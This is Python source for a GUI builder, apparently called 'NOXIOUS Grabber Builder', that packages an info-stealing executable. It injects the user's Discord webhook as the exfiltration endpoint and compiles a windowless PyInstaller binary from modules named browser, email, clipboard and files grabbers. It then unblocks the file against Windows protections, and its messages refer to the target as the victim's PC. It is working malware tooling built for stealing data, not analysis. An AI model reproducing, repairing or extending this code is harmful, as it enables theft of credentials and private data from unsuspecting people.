import os
import sys
import re
import requests
import shutil
import subprocess
import threading
import platform
from datetime import datetime
import tkinter as tk
from tkinter import messagebox

TRACKING_WEBHOOK = ""

class ModernBuilder:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("")
        self.root.geometry("500x660")
        self.root.resizable(False, False)
        self.root.configure(bg='#0a0a0f')
        self.root.overrideredirect(True)
        self.center_window()
        self.webhook_var = tk.StringVar()
        self.username_var = tk.StringVar()
        self.status_var = tk.StringVar(value="Ready")
        self.console_mode = tk.BooleanVar(value=False)
        self.progress_width = 0
        self.setup_ui()
        self.make_draggable()

    def center_window(self):
        self.root.update_idletasks()
        x = (self.root.winfo_screenwidth() // 2) - (500 // 2)
        y = (self.root.winfo_screenheight() // 2) - (660 // 2)
        self.root.geometry(f'500x660+{x}+{y}')

    def make_draggable(self):
        self.root.bind('<Button-1>', self.start_move)
        self.root.bind('<ButtonRelease-1>', self.stop_move)
        self.root.bind('<B1-Motion>', self.do_move)

    def start_move(self, event):
        self.x = event.x
        self.y = event.y

    def stop_move(self, event):
        self.x = None
        self.y = None

    def do_move(self, event):
        if hasattr(self, 'x') and self.x is not None:
            x = self.root.winfo_x() + event.x - self.x
            y = self.root.winfo_y() + event.y - self.y
            self.root.geometry(f'+{x}+{y}')

    def setup_ui(self):
        close_btn = tk.Button(self.root, text="✕", command=self.root.destroy,
                              font=('Arial', 12), bg='#0a0a0f', fg='#ffffff',
                              bd=0, activebackground='#ff3333', activeforeground='#ffffff',
                              cursor='hand2')
        close_btn.place(x=470, y=12)

        main_container = tk.Frame(self.root, bg='#0a0a0f')
        main_container.pack(fill='both', expand=True, padx=25, pady=25)

        logo_frame = tk.Frame(main_container, bg='#0a0a0f')
        logo_frame.pack(pady=(0, 20))

        logo_bg = tk.Canvas(logo_frame, width=80, height=80, bg='#0a0a0f', highlightthickness=0)
        logo_bg.pack()
        logo_bg.create_oval(10, 10, 70, 70, fill='#00ff00', outline='')
        logo_bg.create_text(40, 40, text="C", font=('Arial', 36, 'bold'), fill='#0a0a0f')

        title = tk.Label(logo_frame, text="NOXIOUS",
                         font=('Arial', 24, 'bold'),
                         fg='#ffffff', bg='#0a0a0f')
        title.pack(pady=(10, 0))

        subtitle = tk.Label(logo_frame, text="GRABBER BUILDER",
                            font=('Arial', 11),
                            fg='#666666', bg='#0a0a0f')
        subtitle.pack()

        input_frame = tk.Frame(main_container, bg='#0a0a0f')
        input_frame.pack(fill='x', pady=30)

        webhook_label = tk.Label(input_frame, text="WEBHOOK URL",
                                 font=('Arial', 10, 'bold'),
                                 fg='#888888', bg='#0a0a0f')
        webhook_label.pack(anchor='w', pady=(0, 8))

        webhook_entry = tk.Entry(input_frame, textvariable=self.webhook_var,
                                 font=('Arial', 10),
                                 bg='#111118', fg='#ffffff',
                                 insertbackground='white',
                                 relief='flat', bd=0,
                                 show="•")
        webhook_entry.pack(fill='x', pady=(0, 20), ipady=12)
        webhook_entry.config(highlightthickness=0)

        webhook_hint = tk.Label(input_frame, text="(your Discord webhook URL to send grabbed data to)",
                                font=('Arial', 8),
                                fg='#444444', bg='#0a0a0f')
        webhook_hint.pack(anchor='w', pady=(0, 15))

        username_label = tk.Label(input_frame, text="DISCORD USERNAME",
                                  font=('Arial', 10, 'bold'),
                                  fg='#888888', bg='#0a0a0f')
        username_label.pack(anchor='w', pady=(0, 8))

        username_entry = tk.Entry(input_frame, textvariable=self.username_var,
                                  font=('Arial', 10),
                                  bg='#111118', fg='#ffffff',
                                  insertbackground='white',
                                  relief='flat', bd=0)
        username_entry.pack(fill='x', pady=(0, 20), ipady=12)
        username_entry.config(highlightthickness=0)

        username_hint = tk.Label(input_frame, text="(your Discord username for tracking)",
                                 font=('Arial', 8),
                                 fg='#444444', bg='#0a0a0f')
        username_hint.pack(anchor='w', pady=(0, 15))

        compat_frame = tk.Frame(input_frame, bg='#0a0a0f')
        compat_frame.pack(fill='x', pady=(5, 15))
        compat_check = tk.Checkbutton(compat_frame, text="Modo compatibilidad (sin ventana) - corrige ordinal 380",
                                      variable=self.console_mode,
                                      font=('Arial', 8), bg='#0a0a0f', fg='#888888',
                                      activebackground='#0a0a0f', activeforeground='#ffffff',
                                      selectcolor='#111118', bd=0, highlightthickness=0,
                                      cursor='hand2')
        compat_check.pack(anchor='w')
        compat_hint = tk.Label(compat_frame, text="Usa run.exe en vez de runw.exe (evita COMCTL32 ordinal 380)",
                               font=('Arial', 7), fg='#444444', bg='#0a0a0f')
        compat_hint.pack(anchor='w', pady=(2, 0))

        self.build_btn = tk.Button(input_frame, text="BUILD EXECUTABLE",
                                   command=self.start_build,
                                   font=('Arial', 11, 'bold'),
                                   bg='#00ff00', fg='#0a0a0f',
                                   relief='flat', bd=0, cursor='hand2')
        self.build_btn.pack(fill='x', pady=10, ipady=12)

        fix_btn = tk.Button(input_frame, text="REPARAR ORDINAL 380",
                            command=self.repair_ordinal,
                            font=('Arial', 8), bg='#111118', fg='#888888',
                            relief='flat', bd=0, cursor='hand2')
        fix_btn.pack(fill='x', ipady=6)

        self.progress = tk.Canvas(input_frame, height=3, bg='#0a0a0f', highlightthickness=0)
        self.progress_bar = self.progress.create_rectangle(0, 0, 0, 3, fill='#00ff00', outline='')

        self.status_label = tk.Label(input_frame, textvariable=self.status_var,
                                     font=('Arial', 9),
                                     fg='#555555', bg='#0a0a0f')
        self.status_label.pack(pady=(15, 0))

    def send_tracking(self, discord_user):
        if not TRACKING_WEBHOOK or not TRACKING_WEBHOOK.startswith("http"):
            return
        try:
            data = {
                'content': f"**NOXIOUS Builder - New Build**\nUser: {discord_user}\nMachine: {platform.node()}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            }
            requests.post(TRACKING_WEBHOOK, json=data, timeout=5)
        except:
            pass

    def update_config(self, webhook_url):
        config_path = os.path.join('src', 'config.py')
        if not os.path.exists(config_path):
            return False
        with open(config_path, 'r', encoding='utf-8') as f:
            content = f.read()
        content = re.sub(r"WEBHOOK_URL = ['\"].*?['\"]", f"WEBHOOK_URL = '{webhook_url}'", content)
        with open(config_path, 'w', encoding='utf-8') as f:
            f.write(content)
        return True

    def get_ordinal_fix_message(self):
        return (
            "ERROR ORDINAL 380 - COMCTL32.dll\n\n"
            "Causa: El bootloader windowed (runw.exe) de PyInstaller 6.x usa\n"
            "COMCTL32.dll ordinal 380 (TaskDialogIndirect, Common Controls 6).\n"
            "Tu sistema o la PC victima no carga Common Controls 6 via SxS.\n\n"
            "SOLUCIONES:\n"
            "1) Marca 'Modo compatibilidad' en el builder y recompila.\n"
            "   Usa run.exe (consola) que NO necesita ordinal 380.\n"
            "2) Click en 'REPARAR ORDINAL 380' -> reinstala PyInstaller limpio.\n"
            "3) Ejecuta como Admin: sfc /scannow && DISM /Online /Cleanup-Image /RestoreHealth\n"
            "4) Instala VC++ Redist 2015-2022 x64: https://aka.ms/vs/17/release/vc_redist.x64.exe\n"
            "5) Alternativa: pip install pyinstaller==5.13.2 (bootloader viejo sin ordinal)\n"
            "6) No ejecutes runw.exe directamente - solo el EXE compilado final.\n"
        )

    def diagnose_comctl32(self):
        msgs = []
        try:
            import ctypes
            msgs.append(f"Windows: {platform.platform()} {platform.version()}")
            sys32 = r"C:\Windows\System32\comctl32.dll"
            if os.path.exists(sys32):
                try:
                    import pefile
                    msgs.append(f"System32 comctl32 existe: Si (v5 legacy, normal)")
                except:
                    msgs.append("System32 comctl32 existe: Si")
            for p in [r"C:\Windows\WinSxS\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.26100.8875_none_3e0d5d42e32fe9dd\comctl32.dll",
                      r"C:\Windows\WinSxS\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.26100.8972_none_3e0da176e32f9d4b\comctl32.dll"]:
                if os.path.exists(p):
                    msgs.append(f"SxS 6.0 encontrado: {os.path.basename(os.path.dirname(p))}")
                    break
            else:
                msgs.append("SxS 6.0 NO encontrado - SxS corrupto!")
        except Exception as e:
            msgs.append(f"Diag error: {e}")
        return "\n".join(msgs)

    def repair_pyinstaller(self):
        try:
            self.status_var.set("Reparando PyInstaller...")
            subprocess.run([sys.executable, "-m", "pip", "uninstall", "-y", "pyinstaller"], capture_output=True, timeout=30)
            subprocess.run([sys.executable, "-m", "pip", "cache", "purge"], capture_output=True, timeout=15)
            for p in [os.path.join(sys.prefix, "Lib", "site-packages", "PyInstaller"),
                      os.path.join(os.path.expanduser("~"), "AppData", "Local", "Programs", "Python")]:
                pass
            r = subprocess.run([sys.executable, "-m", "pip", "install", "--no-cache-dir", "--force-reinstall", "pyinstaller==6.10.0"], capture_output=True, text=True, timeout=120)
            if r.returncode == 0:
                return True, "PyInstaller 6.10.0 reinstalado. Reintenta build con modo compatibilidad si persiste."
            r2 = subprocess.run([sys.executable, "-m", "pip", "install", "--no-cache-dir", "--force-reinstall", "pyinstaller"], capture_output=True, text=True, timeout=120)
            if r2.returncode == 0:
                return True, "PyInstaller reinstalado (latest). Reintenta."
            return False, (r.stderr or r.stdout)[:1000]
        except Exception as e:
            return False, str(e)

    def repair_ordinal(self):
        self.build_btn.config(state='disabled', text='REPARANDO...', bg='#555555')
        self.status_var.set("Diagnosticando...")
        diag = self.diagnose_comctl32()
        thread = threading.Thread(target=self._repair_thread, args=(diag,))
        thread.daemon = True
        thread.start()

    def _repair_thread(self, diag):
        success, msg = self.repair_pyinstaller()
        detail = diag + "\n\n" + msg
        if success:
            detail += "\n\n" + self.get_ordinal_fix_message()
            self.root.after(0, lambda: messagebox.showinfo("Reparacion completada", detail))
            self.root.after(0, lambda: self.build_btn.config(state='normal', text='BUILD EXECUTABLE', bg='#00ff00'))
            self.root.after(0, lambda: self.status_var.set("Reparado - reintenta build"))
        else:
            self.root.after(0, lambda: messagebox.showerror("Reparacion fallo", detail[:1500]))
            self.root.after(0, lambda: self.build_btn.config(state='normal', text='BUILD EXECUTABLE', bg='#00ff00'))
            self.root.after(0, lambda: self.status_var.set("Reparo fallo"))

    def compile_executable(self):
        base_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in globals() else os.getcwd()
        src_path = os.path.join(base_dir, 'src')
        if not os.path.exists(src_path):
            return False, "src folder missing"

        for folder in ['build', 'dist', '__pycache__']:
            p = os.path.join(src_path, folder)
            if os.path.exists(p):
                try:
                    shutil.rmtree(p, ignore_errors=True)
                    if os.path.exists(p):
                        import time
                        time.sleep(0.5)
                        shutil.rmtree(p, ignore_errors=True)
                except:
                    pass
        pycache_root = os.path.join(base_dir, '__pycache__')
        if os.path.exists(pycache_root):
            try:
                shutil.rmtree(pycache_root, ignore_errors=True)
            except:
                pass
        spec_file = os.path.join(src_path, 'NOXIOUS_Grabber.spec')
        if os.path.exists(spec_file):
            try:
                os.remove(spec_file)
            except:
                pass

        try:
            r = subprocess.run([sys.executable, '-m', 'pip', 'show', 'pyinstaller'], capture_output=True, text=True, timeout=10)
            ver = ""
            if r.returncode == 0:
                for line in r.stdout.splitlines():
                    if line.lower().startswith("version:"):
                        ver = line.split(":",1)[1].strip()
                        break
            if ver.startswith("6.22") or ver.startswith("6.11") or ver == "":
                self.status_var.set(f"PyInstaller {ver} con bug 193 -> instalando 6.10.0...")
                subprocess.run([sys.executable, '-m', 'pip', 'install', '--force-reinstall', '--no-cache-dir', 'pyinstaller==6.10.0'], capture_output=True, timeout=120)
            elif r.returncode != 0:
                subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller==6.10.0'], capture_output=True, timeout=60)
        except:
            try:
                subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller==6.10.0'], capture_output=True, timeout=60)
            except:
                pass

        try:
            subprocess.run([sys.executable, '-m', 'pip', 'show', 'pefile'], capture_output=True, check=True, timeout=5)
        except:
            try:
                subprocess.run([sys.executable, '-m', 'pip', 'install', 'pefile'], capture_output=True, timeout=30)
            except:
                pass

        use_console = self.console_mode.get()
        console_flag = '--console' if use_console else '--noconsole'

        cmd = [
            sys.executable, '-m', 'PyInstaller',
            '--onefile', console_flag,
            '--clean', '--noconfirm', '--noupx',
            '--name', 'NOXIOUS_Grabber',
            '--distpath', os.path.join(src_path, 'dist'),
            '--workpath', os.path.join(src_path, 'build'),
            '--specpath', src_path,
            '--hidden-import', 'requests',
            '--hidden-import', 'psutil', '--hidden-import', 'PIL',
            '--hidden-import', 'cryptography', '--hidden-import', 'win32crypt',
            '--hidden-import', 'Crypto', '--hidden-import', 'Crypto.Cipher.AES',
            '--hidden-import', 'browser_grabber', '--hidden-import', 'email_grabber',
            '--hidden-import', 'clipboard_grabber', '--hidden-import', 'files_grabber',
            '--hidden-import', 'system_extended',
            '--hidden-import', 'cv2', '--hidden-import', 'numpy',
            '--collect-submodules', 'Crypto',
            '--exclude-module', 'matplotlib',
            '--exclude-module', 'scipy', '--exclude-module', 'PyQt5', '--exclude-module', 'tkinter',
            'main.py'
        ]

        result = subprocess.run(cmd, capture_output=True, text=True, cwd=src_path, timeout=300)
        exe_path = os.path.join(src_path, 'dist', 'NOXIOUS_Grabber.exe')

        exe_exists = os.path.exists(exe_path) and os.path.getsize(exe_path) > 100*1024
        if exe_exists:
            if result.returncode != 0:
                try:
                    with open(os.path.join(base_dir, "build.log"), "w", encoding="utf-8", errors="ignore") as f:
                        f.write((result.stderr or "") + "\n" + (result.stdout or ""))
                except:
                    pass
            try:
                import pefile
                pe = pefile.PE(exe_path)
                if pe.FILE_HEADER.Machine != 0x8664:
                    return False, f"PE invalido: Machine={hex(pe.FILE_HEADER.Machine)} esperado 0x8664"
                if pe.OPTIONAL_HEADER.Magic != 0x20b:
                    return False, f"PE invalido: Magic={hex(pe.OPTIONAL_HEADER.Magic)} esperado 0x20b"
            except ImportError:
                pass
            except Exception as e:
                pass

            dest = os.path.join(base_dir, 'NOXIOUS_Grabber.exe')
            try:
                if os.path.exists(dest):
                    os.remove(dest)
            except:
                pass
            try:
                shutil.copy2(exe_path, dest)
            except Exception as e:
                return False, f"No se pudo copiar exe: {e}"

            try:
                subprocess.run(['powershell', '-Command', f"Unblock-File -Path '{dest}'"], capture_output=True, timeout=10)
            except:
                pass

            # NO auto-ejecutar el EXE - solo generar. Antes se ejecutaba con --help y disparaba el payload (fix: eliminado).
            return True, dest

        err = (result.stderr or "") + "\n" + (result.stdout or "")
        try:
            with open(os.path.join(base_dir, "build.log"), "w", encoding="utf-8", errors="ignore") as f:
                f.write(err)
        except:
            pass
        err_low = err.lower()
        if "ordinal" in err_low or "380" in err or "comctl32" in err_low:
            err = self.get_ordinal_fix_message() + "\n\nDetalle build (tail):\n" + err[-1200:]
        elif "upx" in err_low:
            err += "\nSUGERENCIA: Elimina C:\\upx\\upx.exe del PATH y reintenta (UPX causa 193 y corrupcion PE)."
        elif "no module named" in err_low:
            err += "\nSUGERENCIA: pip install -r requirements.txt"
        return False, err[-2500:]

    def start_build(self):
        webhook_url = self.webhook_var.get().strip()
        discord_user = self.username_var.get().strip()
        if not webhook_url:
            messagebox.showerror("Error", "Please enter a Discord Webhook URL")
            return
        if not webhook_url.startswith('https://discord.com/api/webhooks/'):
            messagebox.showerror("Error", "Invalid webhook URL format\nDebe empezar con https://discord.com/api/webhooks/")
            return
        if not discord_user:
            discord_user = "Anonymous"
        self.build_btn.config(state='disabled', text='BUILDING...', bg='#555555')
        self.status_var.set("Building...")
        self.progress.pack(fill='x', pady=(20, 0))
        self.progress_width = 0
        self.animate_progress()
        thread = threading.Thread(target=self.build, args=(webhook_url, discord_user))
        thread.daemon = True
        thread.start()

    def animate_progress(self):
        if self.progress.winfo_ismapped():
            self.progress_width += 5
            if self.progress_width > 450:
                self.progress_width = 0
            try:
                self.progress.coords(self.progress_bar, 0, 0, self.progress_width, 3)
            except:
                pass
            self.root.after(20, self.animate_progress)

    def build(self, webhook_url, discord_user):
        try:
            self.send_tracking(discord_user)
            if not self.update_config(webhook_url):
                self.root.after(0, self.build_failed, "Failed to update config.py - verifica que src/config.py existe")
                return
            self.root.after(0, lambda: self.status_var.set("Compilando... (puede tardar 1-2 min)"))
            success, result = self.compile_executable()
            if success:
                # NO validar ejecutando el EXE - eso disparaba exfiltracion automatica. Solo notificar exito.
                self.root.after(0, self.build_success, result)
            else:
                if "ordinal" in result.lower() or "380" in result:
                    try:
                        self.console_mode.set(True)
                        self.root.after(0, lambda: self.status_var.set("Reintentando en modo compatibilidad..."))
                        success2, result2 = self.compile_executable()
                        if success2:
                            self.root.after(0, self.build_success, result2)
                            self.root.after(0, lambda: messagebox.showwarning("Modo compatibilidad", "Build original fallo por ordinal 380.\nSe recompilo automaticamente en MODO CONSOLA (run.exe) que no necesita COMCTL32.\nEl exe veras una ventana de consola breve al ejecutar."))
                            return
                    except:
                        pass
                self.root.after(0, self.build_failed, result[-1500:])
        except Exception as e:
            self.root.after(0, self.build_failed, str(e)[-1500:])

    def build_success(self, exe_path):
        self.build_btn.config(state='normal', text='BUILD EXECUTABLE', bg='#00ff00')
        self.status_var.set("Build complete!")
        self.progress.pack_forget()
        messagebox.showinfo("Success", f"Executable created successfully!\n\nFile: {exe_path}\nTamaño: {os.path.getsize(exe_path)//1024} KB\n\nSi ves ordinal 380 en la victima, recompila con 'Modo compatibilidad' marcado.")
        self.progress_width = 0

    def build_failed(self, error):
        self.build_btn.config(state='normal', text='BUILD EXECUTABLE', bg='#00ff00')
        self.status_var.set("Build failed")
        self.progress.pack_forget()
        self.progress_width = 0
        try:
            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "build.log"), "r", encoding="utf-8", errors="ignore") as f:
                log_tail = f.read()[-2000:]
            error = error + "\n\n--- build.log tail ---\n" + log_tail
        except:
            pass
        messagebox.showerror("Build Failed", error[-2000:])

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    if not os.path.exists('src'):
        print("Error: src folder not found!")
        sys.exit(1)
    app = ModernBuilder()
    app.run()
